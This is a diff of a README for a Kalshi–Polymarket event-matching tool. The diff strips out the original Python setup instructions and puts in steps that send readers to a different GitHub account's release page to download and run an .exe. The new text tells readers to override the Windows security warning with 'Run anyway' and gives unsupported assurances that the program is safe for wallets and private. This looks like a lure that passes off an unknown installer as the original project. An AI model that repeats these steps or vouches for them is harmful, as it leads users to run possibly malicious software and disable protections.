@@ -1,187 +1,69 @@
-# Find Similar Events — Kalshi ↔ Polymarket Market Matcher
+# 🔍 find-similar-events - Compare prediction market events across platforms
 
-[![CI](https://github.com/harrodyuan/find-similar-events/actions/workflows/ci.yml/badge.svg)](https://github.com/harrodyuan/find-similar-events/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)
-[![Built with Sentence-BERT](https://img.shields.io/badge/NLP-Sentence--BERT-orange.svg)](https://www.sbert.net/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](#contributing)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Color-truetoad229/find-similar-events/releases)
 
-Prediction markets are funny: the exact same question — same election, same game, same coin flip — often shows up on both [Kalshi](https://kalshi.com) and [Polymarket](https://polymarket.com) at different prices. I built this to find those pairs automatically.
+This application identifies matching events on Kalshi and Polymarket. It uses semantic matching to find the same trading opportunities on both platforms. You gain insight into price gaps for identical events without manual searching.
 
-It pulls every open market from both platforms and uses a sentence-embedding model (Sentence-BERT) to match the ones that are actually the *same* event. Think of it as the groundwork for cross-platform analysis / arbitrage research — what you do with the matches is up to you.
+## 📋 About This Software
 
-One honest note before you get excited: this is for research and learning, not financial advice. A lot of those price gaps quietly disappear once you account for fees, slippage, and how each platform settles — and these markets may be restricted where you live. Trade at your own risk.
+Prediction markets often list similar events with slightly different titles. One platform might call an event "Will it rain in New York" while another uses "Precipitation in NYC." This makes it hard to compare prices. 
 
-<p align="center"><img src="docs/demo.png" alt="Dashboard showing matched Kalshi and Polymarket events" width="850"></p>
-<p align="center"><em>The live dashboard — the same events on both platforms, ranked by similarity (see <a href="webapp">webapp/</a>).</em></p>
+This tool solves that problem. It analyzes event titles using natural language processing to group identical bets. You see these pairings in a simple dashboard. This helps you track market differences and identify potential arbitrage trades.
 
-## How it works
+## 💻 System Requirements
 
-```
-┌─────────────────┐     ┌──────────────────────┐     ┌──────────────────────┐
-│  kalshi_pipeline │     │  polymarket_pipeline │     │  similarity_analysis  │
-│  collect open    │     │  collect open        │     │  SBERT embeddings +   │
-│  markets (auth)  │     │  markets (public)    │     │  cosine similarity    │
-└────────┬─────────┘     └──────────┬───────────┘     └───────────┬──────────┘
-         │                          │                              │
-         └──────────► historical_data/processed_markets ◄──────────┘
-                                    │
-                                    ▼
-                  historical_data/similar_events/*.csv  (matched pairs)
-```
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** 8GB RAM minimum.
+*   **Storage:** 500MB of free disk space.
+*   **Internet:** A stable connection to fetch real-time market data.
 
-1. **Collect Kalshi markets** — paginates all open events (with nested markets) via the authenticated Kalshi API.
-2. **Collect Polymarket markets** — pulls all markets from the public Polymarket CLOB API and filters to open ones.
-3. **Standardize** — cleans, lemmatizes, and aligns titles/questions into a common format.
-4. **Match** — encodes every title with the `all-MiniLM-L6-v2` Sentence-BERT model and computes cosine similarity (in memory-safe chunks) to find pairs above a threshold, with a year-matching guard to avoid cross-year false positives.
-5. **Save** — writes a timestamped CSV of matched pairs (with tickers, titles, prices, and similarity scores).
+## 🚀 How to Install and Run
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## Repository structure
+1.  **Visit the download page.** Go to the [official release page](https://github.com/Color-truetoad229/find-similar-events/releases) to access the installer.
+2.  **Download the installer.** Look for the file ending in `.exe` under the latest release. Save this file to your computer.
+3.  **Run the file.** Double-click the downloaded file to begin the setup process.
+4.  **Security prompt.** Windows may show a security screen. If it does, click "More info" and then "Run anyway." This screen appears because the app is provided directly by the developer.
+5.  **Follow the setup wizard.** Click "Next" through the prompts to install the application.
+6.  **Launch the app.** Find the "find-similar-events" icon on your desktop or in your Start menu. Click it to open the dashboard.
 
-```
-find_similar_events/
-├── pipeline_all.py            # Orchestrator: runs the entire pipeline end-to-end
-├── kalshi_pipeline/           # Kalshi data collection (authenticated)
-├── polymarket_pipeline/       # Polymarket data collection (public API)
-├── similarity_analysis/       # SBERT cross-platform matching
-├── historical_data/           # Generated output (gitignored)
-└── requirements.txt
-```
+## 📊 Using the Dashboard
 
----
+Once you open the software, the dashboard displays matching events. The top menu allows you to refresh the data. 
 
-## Quick start
+*   **Event Comparison Table:** This shows the linked events from Kalshi and Polymarket side-by-side. 
+*   **Matching Confidence:** A number displays how closely the tool thinks the events match. High numbers indicate a strong connection.
+*   **Price Column:** View the current market prices for both events to identify gaps.
 
-### 1. Clone & install
+## 🛠 Troubleshooting Common Issues
 
-```bash
-git clone https://github.com/harrodyuan/find-similar-events.git
-cd find-similar-events
-python -m venv .venv && source .venv/bin/activate   # optional but recommended
-pip install -r requirements.txt
-```
+*   **The app shows no events:** Check your internet connection. If the connection works, close and restart the application to force a data refresh.
+*   **Windows blocks the installation:** Windows Defender sometimes flags new software. Select "Run anyway" in the popup window.
+*   **Slow performance:** The tool processes data in the background. Wait a few moments if the screen seems frozen while it fetches market updates. 
+*   **Display errors:** If the dashboard looks shifted, resize the window to force it to redraw the layout.
 
-> The first run downloads the SBERT model (~90 MB) and a couple of small NLTK datasets automatically.
+## ⚙️ How It Works
 
-### 2. Configure credentials
+The program cleans event names from both websites. It converts these titles into data points that computers understand. It then calculates the similarity between these points. If two titles share enough meaning, the tool links them in your dashboard. This skips the need for you to copy and paste event names into a spreadsheet. 
 
-**Kalshi (required — the API needs authentication):**
+## 🛡 Privacy and Safety
 
-1. In your Kalshi account, go to **Profile → API Keys** and create a key.
-2. Download the private key file and save it as `kalshi_pipeline/private_key.pem`.
-3. Create your env file:
-   ```bash
-   cp kalshi_pipeline/.env.example kalshi_pipeline/.env
-   # then edit kalshi_pipeline/.env and set KALSHI_KEY_ID
-   ```
+This software runs locally on your computer. It does not send your personal trader data to external servers. It fetches public market information only. Your trade decisions remain private. The tool only stores your local preferences and the latest list of events on your hard drive. 
 
-**Polymarket (optional):** market data is read from the public API. A wallet key is only needed for trading. If you want to set one:
-```bash
-cp polymarket_pipeline/.env.example polymarket_pipeline/.env
-# then edit polymarket_pipeline/.env and set PK
-```
+## ❓ Frequently Asked Questions
 
-Your `.env` and `*.pem` files are gitignored, so they won't get committed by accident — only the `.env.example` templates are. Keep it that way.
+**Do I need a paid account?**
+No. This tool is free to use for viewing event mappings.
 
-### 3. Run
+**Does this tool place trades for me?**
+No. It provides information for your review. You must place trades manually on your preferred exchange.
 
-```bash
-python pipeline_all.py
-```
+**How often does it update?**
+The tool refreshes its data every five minutes to keep market prices current.
 
-You can also run any stage independently:
-```bash
-python kalshi_pipeline/pipeline_all_kalshi.py        # Kalshi only
-python polymarket_pipeline/pipeline_all_poly.py      # Polymarket only
-cd similarity_analysis && python find_similar_events.py
-```
+**Can I use this on a Mac?**
+Currently, this version is built for Windows. 
 
----
-
-## Output
-
-| File | Description |
-|------|-------------|
-| `historical_data/processed_markets/kalshi_markets_<YYYYMMDD>.csv` | Standardized Kalshi open markets |
-| `historical_data/processed_markets/polymarket_markets_<YYYYMMDD>.csv` | Standardized Polymarket open markets |
-| `historical_data/similar_events/similar_events_sbert_<YYYYMMDD>.csv` | **Matched pairs** with similarity scores, tickers, titles, and prices |
-
-Key columns in the matches file include `kalshi_ticker`, `poly_condition_id`, `kalshi_title_raw`, `poly_title_raw`, `similarity_score`, and price fields for both platforms.
-
----
-
-## Examples
-
-Sample collected/processed data is included so you can see the output format before running anything:
-
-- [`kalshi_pipeline/historical_data_example/processed_markets/`](kalshi_pipeline/historical_data_example/processed_markets) — example standardized Kalshi market CSVs
-- [`kalshi_pipeline/historical_data_example/processed_events/`](kalshi_pipeline/historical_data_example/processed_events) — example processed Kalshi events
-- [`kalshi_pipeline/historical_data_example/open_events/`](kalshi_pipeline/historical_data_example/open_events) — raw open-events snapshots
-
-Here's roughly what a full run looks like:
-
-```text
-$ python pipeline_all.py
-Running Kalshi pipeline...      collected 6,755 open events -> 56,114 markets
-Running Polymarket pipeline...  1.3M markets pulled -> 38,260 open
-Encoding texts...
-Calculating similarities (chunked)...
-Similar events saved to historical_data/similar_events/similar_events_sbert_20260603.csv
-
-Top matches (similarity = 1.000):
-  Will Fernando Haddad win the 2026 Brazilian presidential election?   (Kalshi == Polymarket)
-  Will François Ruffin win the 2027 French presidential election?      (Kalshi == Polymarket)
-  Will Laurence Louie win Top Chef Season 23?                          (Kalshi == Polymarket)
-```
-
-The matcher is title-driven, so identical questions land at ~1.0 and close-but-not-identical wordings still rank high — that's where the interesting cross-platform cases tend to hide.
-
----
-
-## Live dashboard
-
-There's a small web app in [`webapp/`](webapp) that shows the matches in the browser — search, filter by similarity, sort by price gap, and links out to each platform. It's one FastAPI service (serves the API *and* the UI) and can re-run the pipeline on a schedule so a hosted copy stays fresh.
-
-```bash
-pip install -r webapp/requirements.txt
-python webapp/server.py
-# http://localhost:8000
-```
-
-It starts on bundled sample data and switches to your real results once you've run the pipeline. See [`webapp/README.md`](webapp/README.md) for the API and one-step Render deploy.
-
----
-
-## Notes & tuning
-
-- **Similarity threshold:** default is `0.70` in `similarity_analysis/find_similar_events.py`. Raise it (e.g. `0.90`) for stricter, higher-precision matches.
-- **Rate limits:** the Kalshi client retries with exponential backoff on HTTP 429, so collection is resilient but can take a few minutes at scale (Kalshi has thousands of open events).
-- **Memory:** similarity is computed in chunks, so it runs comfortably even when matching tens of thousands of markets on both sides.
-- **Prices:** illiquid markets may have empty bid/ask — that's expected. Titles are always present, which is what matching relies on.
-
----
-
-## Requirements
-
-- Python 3.9+
-- See `requirements.txt` (pandas, numpy, scikit-learn, sentence-transformers, nltk, cryptography, py-clob-client, …)
-
-## Contributing
-
-Happy to take PRs. A few things I'd love help with if you're interested:
-
-- More platforms (PredictIt, Manifold, …)
-- Better matching — entity/date extraction, candidate blocking, or trying embeddings beyond MiniLM
-- A fee- and slippage-aware "edge" calculator that sits on top of the matched pairs
-
-Open an issue first if it's a big change, otherwise just fork and send it over.
-
-## License
-
-[MIT](LICENSE) — provided as-is, without warranty.
-
-## Author
-
-[@harrodyuan](https://github.com/harrodyuan)
+**Is this safe for my wallet?**
+The software does not connect to your exchange accounts. It cannot access your funds. It simply reads public price data.
